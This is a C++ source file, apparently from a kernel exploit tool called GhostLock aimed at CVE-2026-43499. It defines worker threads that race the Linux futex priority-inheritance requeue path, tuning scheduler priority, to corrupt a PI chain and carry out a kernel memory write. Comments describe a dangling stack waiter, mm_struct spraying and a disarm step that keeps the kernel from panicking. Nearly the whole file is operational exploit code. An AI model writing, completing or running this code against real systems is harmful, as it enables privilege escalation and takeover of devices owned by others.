#include "common.h"
/*
 * GhostLock — PI race worker threads and the per-write route entry.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "race/threads.hpp"
#include "backend/cve_2026_43499_state.hpp"

#include "profile/model.h"
#include "backend/cve_2026_43499/route/route_controller.h"
#include "backend/cve_2026_43499/route/route_policy.hpp"
#include "session/core_session.hpp"

using namespace ghostlock;

namespace ghostlock::race {
    void *waiter_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        const memory::WriteRequest *request = race->request;
        support::disable_rseq_for_thread();
        int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        race->waiter_tid.store(tid);
        if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
            pr_error("waiter lock chain errno=%d\n", errno);
        race->waiter_ready.store(1);
        while (!race->owner_started.load())
            usleep(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_state_poll_interval_us());
        struct timespec timeout;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
        if (race->fast_repair.load()) {
            timeout.tv_nsec += 20000000L;
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        } else {
            uint64_t wait_ns =
                    static_cast<uint64_t>(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_route_wait_ms()) * 1000000ULL;
            timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
            timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        }
        race->waiter_waiting.store(1);
        support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                          &race->target_futex, 0);
        ghostlock::backend::cve_2026_43499::route::RouteController controller;
        controller.init(race, &ghostlock::backend::cve43499_state(session::g_exploit_session).profile);
        race->route_status = controller.execute(request);
        if (controller.fallback_used) {
            pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
        }
        if (ghostlock::backend::cve_2026_43499::route::route_needs_ghost_disarm(ghostlock::backend::cve43499_state(session::g_exploit_session).profile)) {
            /* remove_waiter() left this thread's pi_blocked_on pointing at the
         * reclaimed stack waiter. Force one final slow-path removal while the
         * stack frame is still alive, matching the 5.x multicast primitive's
         * disarm step. Without this, thread exit leaves a walkable dangling
         * ghost and the next mm_struct spray can panic the kernel. */
            uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
            errno = 0;
            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
        }
        race->route_done.store(1);
        support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        while (!race->owner_chain_done.load())
            usleep(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_state_poll_interval_us());
        return nullptr;
    }

    void *owner_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        long lock_target = support::futex_op(
            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
        while (!race->waiter_ready.load() &&
               !race->owner_stop.load())
            usleep(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_state_poll_interval_us());
        if (race->owner_stop.load()) {
            if (lock_target == 0)
                support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            return nullptr;
        }
        race->owner_started.store(1);
        support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        race->owner_chain_done.store(1);
        while (!race->owner_stop.load()) sleep(1);
        if (lock_target == 0)
            support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        return nullptr;
    }

    void *consumer_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        memory::pin_to_core(static_cast<size_t>(race->consumer_cpu));
        pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
        int32_t seen = 0;
        while (!race->consumer_stop.load()) {
            int32_t seq = race->consumer_go.load();
            if (seq == 0 || seq == seen) {
                __asm__ volatile (


                "yield"
                ::: "memory");
                continue;
            }
            seen = seq;
            int32_t tid = race->waiter_tid.load();
            int32_t calls_this_seq = 0;
            while (!race->consumer_stop.load() &&
                   race->consumer_go.load() == seq) {
                uint32_t delay_usec = race->route_delay_usec.load();
                if (delay_usec > 0) usleep(static_cast<useconds_t>(delay_usec));
                for (uint32_t burst = 0;
                     burst < ghostlock::backend::cve43499_state(session::g_exploit_session).profile.select_consumer_burst_calls(); burst++) {
                    if (race->consumer_stop.load() ||
                        race->consumer_go.load() != seq)
                        break;
                    race->consumer_calls.fetch_add(1);
                    race->consumer_inflight.store(1);
                    errno = 0;
                    /* rotate the nice every call; (calls%19)+1 is what makes
                 * sched_setattr succeed on 6.1 compact */
                    int32_t consumer_nice = ghostlock::backend::cve43499_state(session::g_exploit_session).profile.has_compact_waiter()
                                            ? (calls_this_seq % 19) + 1
                                            : memory::PSELECT_CONSUMER_NICE;
                    long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                    if (sched_ret != 0) {
                        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                        long fret = support::futex_op(
                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
                        if (fret == 0) {
                            support::futex_op(
                                &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                            sched_ret = 0;
                        }
                    }
                    if (sched_ret == 0) race->consumer_success.fetch_add(1);
                    race->consumer_inflight.store(0);
                    calls_this_seq++;
                    if (static_cast<uint32_t>(calls_this_seq) >=
                        ghostlock::backend::cve43499_state(session::g_exploit_session).profile.select_consumer_max_calls()) {
                        race->consumer_go.store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }

    void reset_main_route_state(void) {
        int32_t fast_repair = ghostlock::backend::cve43499_state(session::g_exploit_session).race.fast_repair.load();
        if (!ghostlock::backend::cve43499_state(session::g_exploit_session).race.reset(
            fast_repair ? 5000 : ghostlock::backend::cve43499_state(session::g_exploit_session).profile.select_enter_delay_us(),
            config::runtime_config_snapshot().main_cpu,
            config::runtime_config_snapshot().consumer_cpu)) {
            support::fail_stop_dirty_race("reset with live PI workers", EBUSY);
        }
        ghostlock::backend::cve43499_state(session::g_exploit_session).race.fast_repair.store(fast_repair);
    }
} // namespace ghostlock::race

/* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
 * route outcome once the waiter reported completion. The count/timeout policy
 * lives in outcome_with_counters() and TODO(pi-timeout-01). */
ghostlock::backend::cve_2026_43499::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
    while (!waiter_waiting.load() || !owner_started.load())
        usleep(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_state_poll_interval_us());
    pr_info("[route] waiter parked; owner started\n");
    usleep(fast_repair.load()
               ? 5000
               : ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_setup_settle_us());
    errno = 0;
    long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                reinterpret_cast<void *>(1),
                                &target_futex, 0);
    pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
            rq, errno);
    /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
     * the race window (observed when the Shizuku log pipe applied
     * backpressure) parks the process forever and the corrupted PI chain is
     * never disarmed. Bound the wait from profile::TargetProfile.execution and map a
     * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
    struct timespec wait_started{};
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
    const double timeout_ms = static_cast<double>(
        ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_route_done_timeout_ms());
    while (!route_done.load()) {
        if (runtime_time::runtime_elapsed_ms(&wait_started) >= timeout_ms) {
            return ghostlock::backend::cve_2026_43499::route::RouteStatus{
                .code = ghostlock::backend::cve_2026_43499::route::ROUTE_DIRTY_FAILURE,
                .step = 21,
                .error_number = ETIMEDOUT,
            };
        }
        usleep(ghostlock::backend::cve43499_state(session::g_exploit_session).profile.race_state_poll_interval_us());
    }
    const ghostlock::backend::cve_2026_43499::route::RouteStatus status = route_status;
    const int32_t calls = consumer_calls.load();
    const int32_t success = consumer_success.load();
    pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
            "calls=%d success=%d\n", status.code, status.userspace_clean,
            status.kernel_disarmed, status.step, status.error_number,
            calls, success);
    return outcome_with_counters(status, calls, success);
}

namespace ghostlock::race {
    /* Create, synchronize, stop and join one explicitly owned PI race. */
    Status run_main_route_threads(const memory::WriteRequest &request) {
        reset_main_route_state();
        pr_info("[route] creating waiter/owner/consumer\n");
        int32_t error = ghostlock::backend::cve43499_state(session::g_exploit_session).race.start_threads(
            waiter_thread, owner_thread, consumer_thread, &request);
        if (error) {
            if (ghostlock::backend::cve43499_state(session::g_exploit_session).race.route_status.code ==
                ghostlock::backend::cve_2026_43499::route::ROUTE_DIRTY_FAILURE) {
                support::fail_stop_dirty_race(
                    "partial PI worker startup cleanup", error);
            }
            ghostlock::backend::cve43499_state(session::g_exploit_session).race.route_status = ghostlock::backend::cve_2026_43499::route::RouteStatus{
                .code = ghostlock::backend::cve_2026_43499::route::ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
            };
            pr_warning("PI race thread creation failed errno=%d\n", error);
            return 0;
        }
        ghostlock::backend::cve_2026_43499::route::RouteStatus status = ghostlock::backend::cve43499_state(session::g_exploit_session).race.run();
        if (status.code == ghostlock::backend::cve_2026_43499::route::ROUTE_DIRTY_FAILURE) {
            support::fail_stop_dirty_race("route_done deadline", status.error_number);
        }
        ghostlock::backend::cve43499_state(session::g_exploit_session).race.request_stop();
        const int32_t join_error = ghostlock::backend::cve43499_state(session::g_exploit_session).race.join();
        if (join_error != 0) {
            support::fail_stop_dirty_race("PI worker join", join_error);
        }
        pr_info("[route] threads joined\n");
        return status.code == ghostlock::backend::cve_2026_43499::route::ROUTE_OK;
    }
} // namespace ghostlock::race
